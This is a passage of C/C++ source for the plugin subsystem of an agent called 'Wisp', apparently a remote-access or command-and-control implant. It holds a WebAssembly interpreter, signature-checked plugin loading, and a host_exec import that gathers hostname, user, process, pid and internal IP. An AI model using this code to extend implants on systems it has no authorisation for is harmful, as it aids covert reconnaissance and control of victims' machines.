#include "WispPlugin.h"
#include "WispDefines.h"
#include "WispCrypto.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Encoders.h"

extern "C" {
#include "tweetnacl.h"
}

extern "C" void randombytes(unsigned char* p, unsigned long long n)
{
	WispRandom((BYTE*)p, (ULONG)n);
}

#if defined(DEBUG)
static void plog(const char* s)
{
	HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
	DWORD w = 0;
	if (h && h != INVALID_HANDLE_VALUE)
		WriteFile(h, s, StrLenA((CHAR*)s), &w, NULL);
}
#define PLOG(...) do { char __lb[512]; if (ApiWin && ApiWin->snprintf) { ApiWin->snprintf(__lb, sizeof(__lb), __VA_ARGS__); plog(__lb); } } while (0)
#else
#define PLOG(...) do { } while (0)
#endif

static const char* wj_str_arg(WJVal* o, const char* k)
{
	WJVal* v = o ? WJObjGet(o, k) : NULL;
	return v && v->type == WJ_STR ? v->str : NULL;
}

static void pcopy(char* d, ULONG cap, const char* s)
{
	ULONG i = 0;
	if (!d || !cap) return;
	if (s) { while (s[i] && i + 1 < cap) { d[i] = s[i]; i++; } }
	d[i] = 0;
}

#define PLUGIN_MAX 8
#define PLUGIN_CAPS 8
#define WASM_PAGE 65536u
#define WASM_STACK 256
#define WASM_LOCALS 64

typedef struct {
	ULONG np, nr;
	BYTE  p[8], r[4];
} WTYPE;

typedef struct {
	ULONG typeIdx;
	char  iname[32];
	BOOL  isImport;
	ULONG bodyOff, bodyEnd;
	ULONG nLocals;
} WFUNC;

typedef struct {
	BYTE    type;
	BOOL    mut;
	ULONG64 val;
} WGLOBAL;

typedef struct {
	char  name[64];
	BYTE  kind;
	ULONG index;
} WEXPORT;

typedef struct {
	const BYTE* code;
	ULONG       len;
	WTYPE       types[16];   ULONG typeCount;
	WFUNC       funcs[64];   ULONG funcCount;
	ULONG       importFuncs;
	BYTE*       mem;         ULONG memPages; ULONG memMaxPages;
	WGLOBAL     globals[16]; ULONG globalCount;
	WEXPORT     exports[32]; ULONG exportCount;
} WMOD;

typedef struct {
	char    id[64];
	int     abi;
	char    caps[PLUGIN_CAPS][64];
	int     capCount;
	BYTE*   moduleCopy;
	ULONG   moduleLen;
	WMOD    mod;
	BOOL    loaded;
} WPLUGIN;

static WPLUGIN g_plugins[PLUGIN_MAX];

//////// small helpers ////////

static BOOL hex_decode(const char* hex, BYTE* out, ULONG outCap, ULONG* outLen)
{
	ULONG n = StrLenA((CHAR*)hex);
	ULONG i;
	if (!hex || (n & 1) || n / 2 > outCap)
		return FALSE;
	for (i = 0; i < n; i += 2) {
		int hi, lo;
		char a = hex[i], b = hex[i + 1];
		if (a >= '0' && a <= '9') hi = a - '0';
		else if (a >= 'a' && a <= 'f') hi = a - 'a' + 10;
		else if (a >= 'A' && a <= 'F') hi = a - 'A' + 10;
		else return FALSE;
		if (b >= '0' && b <= '9') lo = b - '0';
		else if (b >= 'a' && b <= 'f') lo = b - 'a' + 10;
		else if (b >= 'A' && b <= 'F') lo = b - 'A' + 10;
		else return FALSE;
		out[i / 2] = (BYTE)((hi << 4) | lo);
	}
	*outLen = n / 2;
	return TRUE;
}

typedef struct { const BYTE* p; const BYTE* end; } WCUR;

static BOOL wu(WCUR* c, ULONG* out)
{
	ULONG r = 0;
	int shift = 0;
	BYTE b;
	do {
		if (c->p >= c->end || shift > 28)
			return FALSE;
		b = *c->p++;
		r |= (ULONG)(b & 0x7F) << shift;
		shift += 7;
	} while (b & 0x80);
	*out = r;
	return TRUE;
}

static BOOL wi(WCUR* c, LONG64* out)
{
	ULONG64 r = 0;
	int shift = 0;
	BYTE b;
	do {
		if (c->p >= c->end || shift > 63)
			return FALSE;
		b = *c->p++;
		r |= (ULONG64)(b & 0x7F) << shift;
		shift += 7;
	} while (b & 0x80);
	if (shift < 64 && (b & 0x40))
		r |= (~0ULL) << shift;
	*out = (LONG64)r;
	return TRUE;
}

static BOOL wname(WCUR* c, char* out, ULONG cap)
{
	ULONG n, i;
	if (!wu(c, &n) || n >= cap || c->p + n > c->end)
		return FALSE;
	for (i = 0; i < n; i++) out[i] = (char)c->p[i];
	out[n] = 0;
	c->p += n;
	return TRUE;
}

static WMOD* plugin_mod(WPLUGIN* p) { return &p->mod; }

static ULONG wasm_find_func(WMOD* m, const char* name)
{
	ULONG i;
	for (i = 0; i < m->exportCount; i++)
		if (m->exports[i].kind == 0 && StrCmpA(m->exports[i].name, (CHAR*)name) == 0)
			return m->exports[i].index;
	return (ULONG)-1;
}

static BOOL wasm_has_memory(WMOD* m)
{
	ULONG i;
	for (i = 0; i < m->exportCount; i++)
		if (m->exports[i].kind == 2)
			return TRUE;
	return m->mem != NULL;
}

static BOOL wasm_parse(WMOD* m, const BYTE* code, ULONG len, ULONG maxPages)
{
	WCUR c;
	ULONG i, j;
	memset(m, 0, sizeof(*m));
	m->code = code;
	m->len = len;
	if (len < 8 || code[0] != 0 || code[1] != 'a' || code[2] != 's' || code[3] != 'm' || code[4] != 1)
		return FALSE;
	c.p = code + 8;
	c.end = code + len;
	while (c.p < c.end) {
		BYTE id = *c.p++;
		ULONG sz;
		const BYTE* secEnd;
		WCUR s;
		if (!wu(&c, &sz) || c.p + sz > c.end)
			return FALSE;
		secEnd = c.p + sz;
		s.p = c.p;
		s.end = secEnd;
		switch (id) {
		case 1: { // types
			ULONG n;
			if (!wu(&s, &n) || n > 16) return FALSE;
			m->typeCount = n;
			for (i = 0; i < n; i++) {
				BYTE form;
				ULONG np, nr;
				if (s.p >= s.end || *s.p++ != 0x60) return FALSE;
				if (!wu(&s, &np) || np > 8) return FALSE;
				m->types[i].np = np;
				for (j = 0; j < np; j++) {
					if (s.p >= s.end) return FALSE;
					m->types[i].p[j] = *s.p++;
				}
				if (!wu(&s, &nr) || nr > 4) return FALSE;
				m->types[i].nr = nr;
				for (j = 0; j < nr; j++) {
					if (s.p >= s.end) return FALSE;
					m->types[i].r[j] = *s.p++;
				}
			}
			break;
		}
		case 2: { // imports (functions only)
			ULONG n;
			if (!wu(&s, &n) || n > 16) return FALSE;
			for (i = 0; i < n; i++) {
				char mod[32];
				BYTE kind;
				if (!wname(&s, mod, sizeof(mod)) || !wname(&s, m->funcs[m->funcCount].iname, sizeof(m->funcs[0].iname)))
					return FALSE;
				if (s.p >= s.end) return FALSE;
				kind = *s.p++;
				if (kind != 0) return FALSE; // only env functions are supported
				if (!wu(&s, &m->funcs[m->funcCount].typeIdx)) return FALSE;
				m->funcs[m->funcCount].isImport = TRUE;
				m->funcCount++;
			}
			m->importFuncs = m->funcCount;
			break;
		}
		case 3: { // function declarations
			ULONG n;
			if (!wu(&s, &n) || m->funcCount + n > 64) return FALSE;
			for (i = 0; i < n; i++) {
				if (!wu(&s, &m->funcs[m->funcCount].typeIdx)) return FALSE;
				m->funcs[m->funcCount].isImport = FALSE;
				m->funcCount++;
			}
			break;
		}
		case 5: { // memory
			ULONG n;
			if (!wu(&s, &n) || n > 1) return FALSE;
			if (n) {
				ULONG flags, mn, mx;
				if (!wu(&s, &flags) || !wu(&s, &mn)) return FALSE;
				if (flags & 1) {
					if (!wu(&s, &mx)) return FALSE;
				}
				else mx = maxPages;
				if (mn > maxPages) return FALSE;
				if (mx > maxPages) mx = maxPages;
				if (mx < mn) mx = mn;
				m->memPages = mn;
				m->memMaxPages = mx;
				if (mn) {
					m->mem = (BYTE*)MemAllocLocal(mn * WASM_PAGE);
					if (!m->mem) return FALSE;
					memset(m->mem, 0, mn * WASM_PAGE);
				}
			}
			break;
		}
		case 6: { // globals
			ULONG n;
			if (!wu(&s, &n) || n > 16) return FALSE;
			for (i = 0; i < n; i++) {
				BYTE t, mut, op;
				LONG64 v;
				if (s.p >= s.end) return FALSE;
				t = *s.p++;
				if (s.p >= s.end) return FALSE;
				mut = *s.p++;
				if (s.p >= s.end) return FALSE;
				op = *s.p++;
				if (op == 0x41) {
					ULONG x; LONG64 sv;
					if (!wi(&s, &sv)) return FALSE;
					x = (ULONG)sv;
					if (s.p >= s.end || *s.p++ != 0x0b) return FALSE;
					m->globals[i].val = x;
				}
				else if (op == 0x42) {
					if (!wi(&s, &v)) return FALSE;
					if (s.p >= s.end || *s.p++ != 0x0b) return FALSE;
					m->globals[i].val = (ULONG64)v;
				}
				else return FALSE;
				m->globals[i].type = t;
				m->globals[i].mut = mut;
			}
			m->globalCount = n;
			break;
		}
		case 7: { // exports
			ULONG n;
			if (!wu(&s, &n) || n > 32) return FALSE;
			for (i = 0; i < n; i++) {
				if (!wname(&s, m->exports[i].name, sizeof(m->exports[0].name))) return FALSE;
				if (s.p >= s.end) return FALSE;
				m->exports[i].kind = *s.p++;
				if (!wu(&s, &m->exports[i].index)) return FALSE;
			}
			m->exportCount = n;
			break;
		}
		case 10: { // code
			ULONG n;
			if (!wu(&s, &n)) return FALSE;
			for (i = 0; i < n && m->importFuncs + i < m->funcCount; i++) {
				ULONG bodySize, groups;
				const BYTE* bodyEnd;
				ULONG totalLocals = 0;
				WFUNC* fn = &m->funcs[m->importFuncs + i];
				if (!wu(&s, &bodySize) || s.p + bodySize > s.end) return FALSE;
				bodyEnd = s.p + bodySize;
				if (!wu(&s, &groups)) return FALSE;
				for (j = 0; j < groups; j++) {
					ULONG cnt;
					BYTE t;
					if (!wu(&s, &cnt) || s.p >= bodyEnd) return FALSE;
					t = *s.p++;
					(void)t;
					totalLocals += cnt;
					if (totalLocals > WASM_LOCALS) return FALSE;
				}
				fn->nLocals = totalLocals;
				fn->bodyOff = (ULONG)(s.p - m->code);
				fn->bodyEnd = (ULONG)(bodyEnd - m->code);
				s.p = bodyEnd;
			}
			break;
		}
		case 11: { // data
			ULONG n;
			if (!wu(&s, &n)) return FALSE;
			for (i = 0; i < n; i++) {
				ULONG memidx, sz;
				LONG64 off;
				if (!wu(&s, &memidx)) return FALSE;
				if (s.p >= s.end || *s.p++ != 0x41) return FALSE;
				if (!wi(&s, &off)) return FALSE;
				if (s.p >= s.end || *s.p++ != 0x0b) return FALSE;
				if (!wu(&s, &sz) || s.p + sz > s.end) return FALSE;
				if (m->mem && off >= 0 && (ULONG64)off + sz <= (ULONG64)m->memPages * WASM_PAGE)
					memcpy(m->mem + off, s.p, sz);
				s.p += sz;
			}
			break;
		}
		default:
			break;
		}
		c.p = secEnd;
	}
	return TRUE;
}

static void wasm_free(WMOD* m)
{
	if (m->mem) {
		MemFreeLocal((LPVOID*)&m->mem, m->memPages * WASM_PAGE);
		m->mem = NULL;
	}
}

//////// interpreter ////////

typedef struct {
	WMOD*    m;
	WPLUGIN* pl;
	ULONG    budget;
	ULONG    startTick;
} WCTX;

static BOOL wcall(WCTX* x, ULONG idx, ULONG64* args, ULONG argc, ULONG64* out, ULONG* outN, int depth);
static BOOL wu_local(WMOD* m, ULONG* pc, ULONG* out);
static BOOL wi_local(WMOD* m, ULONG* pc, LONG64* out);

static BOOL mem_read(WMOD* m, ULONG ptr, ULONG len, BYTE* out)
{
	if (!m->mem || ptr > m->memPages * WASM_PAGE || len > m->memPages * WASM_PAGE - ptr)
		return FALSE;
	memcpy(out, m->mem + ptr, len);
	return TRUE;
}

static BOOL mem_write(WMOD* m, ULONG ptr, const BYTE* src, ULONG len)
{
	if (!m->mem || ptr > m->memPages * WASM_PAGE || len > m->memPages * WASM_PAGE - ptr)
		return FALSE;
	memcpy(m->mem + ptr, src, len);
	return TRUE;
}

static BOOL cap_has(WPLUGIN* p, const char* want)
{
	int i;
	for (i = 0; i < p->capCount; i++) {
		if (StrCmpA(p->caps[i], (CHAR*)want) == 0 || StrCmpA(p->caps[i], (CHAR*)"host.*") == 0)
			return TRUE;
	}
	return FALSE;
}

static BOOL host_sysinfo_json(char** out)
{
	WJVal* v = WJNewObj();
	CHAR* host; CHAR* user; CHAR* proc; ULONG ip;
	char ipbuf[32];
	if (!v) return FALSE;
	host = _GetHostName();
	user = _GetUserName();
	proc = _GetProcessName();
	ip = GetInternalIpLong();
	if (ApiWin->snprintf)
		ApiWin->snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u",
			((BYTE*)&ip)[0], ((BYTE*)&ip)[1], ((BYTE*)&ip)[2], ((BYTE*)&ip)[3]);
	else
		pcopy(ipbuf, sizeof(ipbuf), "0.0.0.0");
	WJObjPutStr(v, "hostname", host ? host : "");
	WJObjPutStr(v, "os", "windows");
	WJObjPutStr(v, "arch", sizeof(void*) == 8 ? "amd64" : "386");
	WJObjPutStr(v, "user", user ? user : "");
	WJObjPutNum(v, "pid", (double)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueProcess);
	WJObjPutStr(v, "process", proc ? proc : "");
	WJObjPutStr(v, "agent_ver", WISP_AGENT_VER);
	WJObjPutStr(v, "internal_ip", ipbuf);
	*out = WJSerialize(v);
	WJFree(v);
	if (host) { ULONG n = StrLenA(host); MemFreeLocal((LPVOID*)&host, n + 1); }
	if (user) { ULONG n = StrLenA(user); MemFreeLocal((LPVOID*)&user, n + 1); }
	if (proc) { ULONG n = StrLenA(proc); MemFreeLocal((LPVOID*)&proc, n + 1); }
	return *out != NULL;
}

static BOOL host_exec_impl(WCTX* x, ULONG ptr, ULONG len, ULONG64* out)
{
	BYTE* req = NULL;
	WJVal* j = NULL;
	const char* cmd = NULL;
	WJVal* v = NULL;
	char* js = NULL;
	ULONG allocIdx;
	ULONG64 av[1];
	ULONG64 rv[1];
	ULONG rn = 0;
	BOOL ok = FALSE;

	if (!len || len > 64 * 1024 || !x->m->mem)
		return FALSE;
	req = (BYTE*)MemAllocLocal(len + 1);
	if (!req)
		return FALSE;
	if (!mem_read(x->m, ptr, len, req)) goto done;
	req[len] = 0;
	j = WJParse((const char*)req, len);
	if (!j) goto done;
	cmd = j && WJObjGet(j, "cmd") && WJObjGet(j, "cmd")->type == WJ_STR ? WJObjGet(j, "cmd")->str : NULL;
	if (!cmd || !cmd[0]) goto done;
	v = WJNewObj();
	if (!v) goto done;
	if (StrCmpA((CHAR*)cmd, (CHAR*)"sysinfo") == 0) {
		char* sys = NULL;
		char want[64];
		if (ApiWin->snprintf) ApiWin->snprintf(want, sizeof(want), "host.%s", cmd);
		if (!cap_has(x->pl, want)) {
			WJObjPut(v, "ok", WJNewBool(FALSE));
			WJObjPutStr(v, "output", "capability not granted");
			WJObjPutNum(v, "exit", -1);
		}
		else if (host_sysinfo_json(&sys)) {
			WJObjPut(v, "ok", WJNewBool(TRUE));
			WJObjPutStr(v, "output", sys);
			WJObjPutNum(v, "exit", 0);
			{
				ULONG n = StrLenA(sys);
				MemFreeLocal((LPVOID*)&sys, n + 1);
			}
		}
		else goto done;
	}
	else if (StrCmpA((CHAR*)cmd, (CHAR*)"pwd") == 0) {
		char path[MAX_PATH];
		char want[64];
		if (ApiWin->snprintf) ApiWin->snprintf(want, sizeof(want), "host.%s", cmd);
		if (!cap_has(x->pl, want)) {
			WJObjPut(v, "ok", WJNewBool(FALSE));
			WJObjPutStr(v, "output", "capability not granted");
			WJObjPutNum(v, "exit", -1);
		}
		else {
			GetCurrentDirectoryA(MAX_PATH, path);
			WJObjPut(v, "ok", WJNewBool(TRUE));
			WJObjPutStr(v, "output", path);
			WJObjPutNum(v, "exit", 0);
		}
	}
	else {
		WJObjPut(v, "ok", WJNewBool(FALSE));
		WJObjPutStr(v, "output", "host command not implemented in C++ plugin host");
		WJObjPutNum(v, "exit", -1);
	}
	js = WJSerialize(v);
	if (!js) goto done;
	{
		ULONG n = StrLenA(js);
		ULONG idx = wasm_find_func(x->m, "alloc");
		ULONG64 src[1];
		if (idx == (ULONG)-1) goto done;
		src[0] = n;
		if (!wcall(x, idx, src, 1, rv, &rn, 0) || rn < 1) goto done;
		if (!mem_write(x->m, (ULONG)rv[0], (const BYTE*)js, n)) goto done;
		*out = ((ULONG64)(ULONG)rv[0] << 32) | n;
		ok = TRUE;
		MemFreeLocal((LPVOID*)&js, n + 1);
	}
done:
	if (req) MemFreeLocal((LPVOID*)&req, len + 1);
	if (j) WJFree(j);
	if (v) WJFree(v);
	if (js) { ULONG n = StrLenA(js); MemFreeLocal((LPVOID*)&js, n + 1); }
	return ok;
}

static BOOL import_call(WCTX* x, WFUNC* fn, ULONG64* args, ULONG argc, ULONG64* out, ULONG* outN)
{
	*outN = 0;
	if (StrCmpA(fn->iname, (CHAR*)"host_log") == 0) {
		if (argc >= 2 && x->m->mem) {
			ULONG ptr = (ULONG)args[0], len = (ULONG)args[1];
			if (len > 4096) len = 4096;
			if (ptr <= x->m->memPages * WASM_PAGE && len <= x->m->memPages * WASM_PAGE - ptr) {
				char* buf = (char*)MemAllocLocal(len + 1);
				if (buf) {
					memcpy(buf, x->m->mem + ptr, len);
					buf[len] = 0;
					PLOG("plugin[%s]> %s\n", x->pl->id, buf);
					MemFreeLocal((LPVOID*)&buf, len + 1);
				}
			}
		}
		return TRUE;
	}
	if (StrCmpA(fn->iname, (CHAR*)"host_now") == 0) {
		out[0] = (ULONG64)(ApiWin->GetTickCount() / 1000);
		*outN = 1;
		return TRUE;
	}
	if (StrCmpA(fn->iname, (CHAR*)"host_rand") == 0) {
		if (argc >= 2 && x->m->mem) {
			ULONG ptr = (ULONG)args[0], len = (ULONG)args[1];
			if (len > 4096) len = 4096;
			if (ptr <= x->m->memPages * WASM_PAGE && len <= x->m->memPages * WASM_PAGE - ptr)
				WispRandom(x->m->mem + ptr, len);
		}
		return TRUE;
	}
	if (StrCmpA(fn->iname, (CHAR*)"host_exec") == 0) {
		if (argc < 2) return FALSE;
		if (!host_exec_impl(x, (ULONG)args[0], (ULONG)args[1], &out[0]))
			return FALSE;
		*outN = 1;
		return TRUE;
	}
	return FALSE;
}

static BOOL wcall(WCTX* x, ULONG idx, ULONG64* args, ULONG argc, ULONG64* out, ULONG* outN, int depth)
{
	WMOD* m = x->m;
	WFUNC* fn;
	WTYPE* t;
	ULONG64* locals;
	ULONG64* stack;
	ULONG sp = 0;
	ULONG pc, endpc;
	ULONG i;
	BOOL ret = FALSE;

	if (depth > 16 || idx >= m->funcCount)
		return FALSE;
	fn = &m->funcs[idx];
	if (fn->typeIdx >= m->typeCount)
		return FALSE;
	t = &m->types[fn->typeIdx];
	if (fn->isImport)
		return import_call(x, fn, args, argc, out, outN);
	if (t->np > argc)
		return FALSE;

	locals = (ULONG64*)MemAllocLocal(WASM_LOCALS * sizeof(ULONG64));
	stack = (ULONG64*)MemAllocLocal(WASM_STACK * sizeof(ULONG64));
	if (!locals || !stack) {
		if (locals) MemFreeLocal((LPVOID*)&locals, WASM_LOCALS * sizeof(ULONG64));
		if (stack) MemFreeLocal((LPVOID*)&stack, WASM_STACK * sizeof(ULONG64));
		return FALSE;
	}
	memset(locals, 0, WASM_LOCALS * sizeof(ULONG64));
	for (i = 0; i < t->np && i < WASM_LOCALS; i++)
		locals[i] = args[i];

	pc = fn->bodyOff;
	endpc = fn->bodyEnd;
	while (pc < endpc) {
		BYTE op = m->code[pc++];
		if (--x->budget == 0) goto done;
		if ((x->budget & 0xFFF) == 0 && ApiWin->GetTickCount() - x->startTick > 5000) goto done;
		switch (op) {
		case 0x00: goto done;
		case 0x01: break;
		case 0x0b: case 0x0f: goto function_end;
		case 0x10: {
			ULONG cidx;
			ULONG64 cargs[8];
			ULONG64 cres[4];
			ULONG cn = 0, k;
			WTYPE* ct;
			if (!wu_local(m, &pc, &cidx)) goto done;
			if (cidx >= m->funcCount || m->funcs[cidx].typeIdx >= m->typeCount) goto done;
			ct = &m->types[m->funcs[cidx].typeIdx];
			if (ct->np > 8 || sp < ct->np) goto done;
			for (k = 0; k < ct->np; k++)
				cargs[ct->np - 1 - k] = stack[--sp];
			if (!wcall(x, cidx, cargs, ct->np, cres, &cn, depth + 1)) goto done;
			for (k = 0; k < cn; k++) {
				if (sp >= WASM_STACK) goto done;
				stack[sp++] = cres[k];
			}
			(void)cn;
			break;
		}
		case 0x1a: if (sp < 1) goto done; sp--; break;
		case 0x1b: {
			ULONG64 c, b2, a2;
			if (sp < 3) goto done;
			c = stack[--sp]; b2 = stack[--sp]; a2 = stack[--sp];
			stack[sp++] = c ? b2 : a2;
			break;
		}
		case 0x20: { ULONG n; if (!wu_local(m, &pc, &n) || n >= WASM_LOCALS) goto done; if (sp >= WASM_STACK) goto done; stack[sp++] = locals[n]; break; }
		case 0x21: { ULONG n; if (!wu_local(m, &pc, &n) || n >= WASM_LOCALS || sp < 1) goto done; locals[n] = stack[--sp]; break; }
		case 0x22: { ULONG n; if (!wu_local(m, &pc, &n) || n >= WASM_LOCALS || sp < 1) goto done; locals[n] = stack[sp - 1]; break; }
		case 0x23: { ULONG n; if (!wu_local(m, &pc, &n) || n >= m->globalCount || sp >= WASM_STACK) goto done; stack[sp++] = m->globals[n].val; break; }
		case 0x24: { ULONG n; if (!wu_local(m, &pc, &n) || n >= m->globalCount || sp < 1) goto done; if (m->globals[n].mut) m->globals[n].val = stack[--sp]; else goto done; break; }
		case 0x41: { LONG64 v; if (!wi_local(m, &pc, &v)) goto done; if (sp >= WASM_STACK) goto done; stack[sp++] = (ULONG64)(ULONG)v; break; }
		case 0x42: { LONG64 v; if (!wi_local(m, &pc, &v)) goto done; if (sp >= WASM_STACK) goto done; stack[sp++] = (ULONG64)v; break; }
		case 0x45: if (sp < 1) goto done; stack[sp - 1] = ((ULONG)stack[sp - 1] == 0) ? 1 : 0; break;
		case 0x50: if (sp < 1) goto done; stack[sp - 1] = (stack[sp - 1] == 0) ? 1 : 0; break;
		case 0x46: case 0x47: case 0x48: case 0x49: case 0x4a: case 0x4b: case 0x4c: case 0x4d: case 0x4e: case 0x4f: {
			ULONG64 b2, a2; if (sp < 2) goto done; b2 = stack[--sp]; a2 = stack[--sp];
			switch (op) {
			case 0x46: stack[sp++] = ((LONG)a2 == (LONG)b2); break;
			case 0x47: stack[sp++] = ((LONG)a2 != (LONG)b2); break;
			case 0x48: stack[sp++] = ((LONG)a2 < (LONG)b2); break;
			case 0x49: stack[sp++] = ((ULONG)a2 < (ULONG)b2); break;
			case 0x4a: stack[sp++] = ((LONG)a2 > (LONG)b2); break;
			case 0x4b: stack[sp++] = ((ULONG)a2 > (ULONG)b2); break;
			case 0x4c: stack[sp++] = ((LONG)a2 <= (LONG)b2); break;
			case 0x4d: stack[sp++] = ((ULONG)a2 <= (ULONG)b2); break;
			case 0x4e: stack[sp++] = ((LONG)a2 >= (LONG)b2); break;
			default: stack[sp++] = ((ULONG)a2 >= (ULONG)b2); break;
			}
			break;
		}
		case 0x6a: case 0x6b: case 0x6c: case 0x6d: case 0x6e: case 0x6f:
		case 0x70: case 0x71: case 0x72: case 0x73: case 0x74: case 0x75: case 0x76: {
			ULONG a2, b2, r2;
			if (sp < 2) goto done;
			b2 = (ULONG)stack[--sp]; a2 = (ULONG)stack[--sp];
			switch (op) {
			case 0x6a: r2 = a2 + b2; break;
			case 0x6b: r2 = a2 - b2; break;
			case 0x6c: r2 = a2 * b2; break;
			case 0x6d: if (b2 == 0) goto done; r2 = (ULONG)((LONG)a2 / (LONG)b2); break;
			case 0x6e: if (b2 == 0) goto done; r2 = a2 / b2; break;
			case 0x6f: if (b2 == 0) goto done; r2 = (ULONG)((LONG)a2 % (LONG)b2); break;
			case 0x70: if (b2 == 0) goto done; r2 = a2 % b2; break;
			case 0x71: r2 = a2 & b2; break;
			case 0x72: r2 = a2 | b2; break;
			case 0x73: r2 = a2 ^ b2; break;
			case 0x74: r2 = a2 << (b2 & 31); break;
			case 0x75: r2 = (ULONG)((LONG)a2 >> (b2 & 31)); break;
			default: r2 = a2 >> (b2 & 31); break;
			}
			stack[sp++] = r2;
			break;
		}
		case 0x7c: case 0x7d: case 0x7e: {
			ULONG64 b2, a2; if (sp < 2) goto done; b2 = stack[--sp]; a2 = stack[--sp];
			if (op == 0x7c) stack[sp++] = a2 + b2;
			else if (op == 0x7d) stack[sp++] = a2 - b2;
			else stack[sp++] = a2 * b2;
			break;
		}
		case 0xa7: if (sp < 1) goto done; stack[sp - 1] = (ULONG)stack[sp - 1]; break;
		case 0xac: if (sp < 1) goto done; stack[sp - 1] = (ULONG64)(LONG64)(LONG)stack[sp - 1]; break;
		case 0xad: if (sp < 1) goto done; stack[sp - 1] = (ULONG)stack[sp - 1]; break;
		case 0x3f: if (sp >= WASM_STACK) goto done; stack[sp++] = m->memPages; break;
		case 0x40: if (sp < 1) goto done; sp--; if (sp >= WASM_STACK) goto done; stack[sp++] = (ULONG64)(ULONG)-1; break;
		case 0x28: case 0x29: case 0x2c: case 0x2d: case 0x2e: case 0x2f:
		case 0x36: case 0x37: case 0x3a: case 0x3b: {
			ULONG align, off;
			if (!wu_local(m, &pc, &align) || !wu_local(m, &pc, &off)) goto done;
			(void)align;
			if (op == 0x28 || op == 0x29 || op == 0x2c || op == 0x2d || op == 0x2e || op == 0x2f) {
				ULONG64 base;
				ULONG addr;
				ULONG64 v2 = 0;
				if (sp < 1) goto done;
				base = stack[--sp];
				addr = (ULONG)base + off;
				if (addr > m->memPages * WASM_PAGE) goto done;
				if (op == 0x28) { if (addr + 4 > m->memPages * WASM_PAGE) goto done; memcpy(&v2, m->mem + addr, 4); }
				else if (op == 0x29) { if (addr + 8 > m->memPages * WASM_PAGE) goto done; memcpy(&v2, m->mem + addr, 8); }
				else if (op == 0x2c) { if (addr + 1 > m->memPages * WASM_PAGE) goto done; v2 = (ULONG64)(LONG64)(LONG)(signed char)m->mem[addr]; }
				else if (op == 0x2d) { if (addr + 1 > m->memPages * WASM_PAGE) goto done; v2 = m->mem[addr]; }
				else if (op == 0x2e) { short sv; if (addr + 2 > m->memPages * WASM_PAGE) goto done; memcpy(&sv, m->mem + addr, 2); v2 = (ULONG64)(LONG64)sv; }
				else { unsigned short sv; if (addr + 2 > m->memPages * WASM_PAGE) goto done; memcpy(&sv, m->mem + addr, 2); v2 = sv; }
				stack[sp++] = v2;
			}
			else {
				ULONG64 val, base;
				ULONG addr;
				if (sp < 2) goto done;
				val = stack[--sp]; base = stack[--sp];
				addr = (ULONG)base + off;
				if (op == 0x36) { if (addr + 4 > m->memPages * WASM_PAGE) goto done; memcpy(m->mem + addr, &val, 4); }
				else if (op == 0x37) { if (addr + 8 > m->memPages * WASM_PAGE) goto done; memcpy(m->mem + addr, &val, 8); }
				else if (op == 0x3a) { if (addr + 1 > m->memPages * WASM_PAGE) goto done; m->mem[addr] = (BYTE)val; }
				else { unsigned short sv = (unsigned short)val; if (addr + 2 > m->memPages * WASM_PAGE) goto done; memcpy(m->mem + addr, &sv, 2); }
			}
			break;
		}
		default:
			PLOG("plugin[%s]: unsupported opcode 0x%02x\n", x->pl->id, op);
			goto done;
		}
	}
function_end:
	if (sp < t->nr)
		goto done;
	for (i = 0; i < t->nr; i++)
		out[i] = stack[sp - t->nr + i];
	*outN = t->nr;
	ret = TRUE;
done:
	MemFreeLocal((LPVOID*)&locals, WASM_LOCALS * sizeof(ULONG64));
	MemFreeLocal((LPVOID*)&stack, WASM_STACK * sizeof(ULONG64));
	return ret;
}

static BOOL wu_local(WMOD* m, ULONG* pc, ULONG* out)
{
	WCUR c;
	c.p = m->code + *pc;
	c.end = m->code + m->len;
	if (!wu(&c, out))
		return FALSE;
	*pc = (ULONG)(c.p - m->code);
	return TRUE;
}

static BOOL wi_local(WMOD* m, ULONG* pc, LONG64* out)
{
	WCUR c;
	c.p = m->code + *pc;
	c.end = m->code + m->len;
	if (!wi(&c, out))
		return FALSE;
	*pc = (ULONG)(c.p - m->code);
	return TRUE;
}

//////// plugin registry ////////

static WPLUGIN* plugin_find(const char* id)
{
	int i;
	for (i = 0; i < PLUGIN_MAX; i++)
		if (g_plugins[i].loaded && StrCmpA(g_plugins[i].id, (CHAR*)id) == 0)
			return &g_plugins[i];
	return NULL;
}

static void plugin_clear(WPLUGIN* p)
{
	if (p->mod.mem)
		MemFreeLocal((LPVOID*)&p->mod.mem, p->mod.memPages * WASM_PAGE);
	if (p->moduleCopy)
		MemFreeLocal((LPVOID*)&p->moduleCopy, p->moduleLen);
	memset(p, 0, sizeof(*p));
}

void WispPluginShutdown(void)
{
	int i;
	for (i = 0; i < PLUGIN_MAX; i++)
		if (g_plugins[i].loaded)
			plugin_clear(&g_plugins[i]);
}

BOOL WispPluginLoad(const WispConfig* cfg, WJVal* args, WJVal* res)
{
	const char* manifest;
	const char* modB64;
	const char* sigS;
	const char* id;
	const char* version;
	BYTE pk[32];
	ULONG pkLen = 0;
	BYTE* module = NULL;
	BYTE* sig = NULL;
	BYTE* sm = NULL;
	BYTE* msg = NULL;
	ULONG moduleLen = 0, sigLen = 0, manLen = 0, smLen = 0;
	ULONG64 mlen = 0;
	WPLUGIN* slot = NULL;
	WPLUGIN* tmp;
	int i;
	BOOL ok = FALSE;
	tmp = (WPLUGIN*)MemAllocLocal(sizeof(WPLUGIN));
	if (!tmp) {
		WJObjPutStr(res, "output", "plugin: oom");
		return FALSE;
	}
	memset(tmp, 0, sizeof(*tmp));

	if (!cfg || !cfg->pluginPubkey[0]) {
		WJObjPutStr(res, "output", "plugin: no plugin_pubkey in config");
		return FALSE;
	}
	manifest = wj_str_arg(args, "manifest");
	modB64 = wj_str_arg(args, "module");
	sigS = wj_str_arg(args, "sig");
	id = wj_str_arg(args, "id");
	version = wj_str_arg(args, "version");
	if (!id || !id[0]) id = "plugin";
	if (!version) version = "";
	if (!manifest || !modB64 || !sigS) {
		WJObjPutStr(res, "output", "plugin: missing manifest/module/sig");
		return FALSE;
	}
	if (!hex_decode(cfg->pluginPubkey, pk, sizeof(pk), &pkLen) || pkLen != 32) {
		WJObjPutStr(res, "output", "plugin: bad plugin_pubkey");
		return FALSE;
	}
	moduleLen = (ULONG)b64_decoded_size(modB64);
	if (moduleLen == 0 || moduleLen > 8 * 1024 * 1024) {
		WJObjPutStr(res, "output", "plugin: bad module size");
		return FALSE;
	}
